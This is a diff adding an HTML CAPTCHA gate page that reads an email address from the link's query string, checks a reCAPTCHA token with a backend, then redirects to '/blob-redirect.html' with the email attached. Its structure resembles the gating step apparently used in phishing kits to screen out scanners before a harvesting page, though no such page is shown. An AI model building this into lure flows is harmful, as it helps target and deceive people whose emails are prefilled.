@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Human</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        body { display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:Arial; }
+    </style>
+</head>
+<body>
+
+<div>
+    <h3>Verify you are human</h3>
+
+    <!-- PASTE YOUR SITE KEY BELOW -->
+    <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY_HERE"></div>
+
+    <br>
+    <button id="go">Continue</button>
+    <p id="msg"></p>
+</div>
+
+<script>
+document.getElementById("go").addEventListener("click", async () => {
+    const token = grecaptcha.getResponse();
+    if (!token) {
+        alert("Please complete CAPTCHA");
+        return;
+    }
+
+    document.getElementById("msg").innerText = "Checking...";
+
+    const email = new URLSearchParams(location.search).get("email") || "";
+
+    const res = await fetch("/api/verify-captcha", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token, email })
+    });
+
+    const data = await res.json();
+    if (!data.success) {
+        alert("Verification failed");
+        grecaptcha.reset();
+        return;
+    }
+
+    window.location.href = "/blob-redirect.html?email=" + encodeURIComponent(email);
+});
+</script>
+
+</body>
+</html>
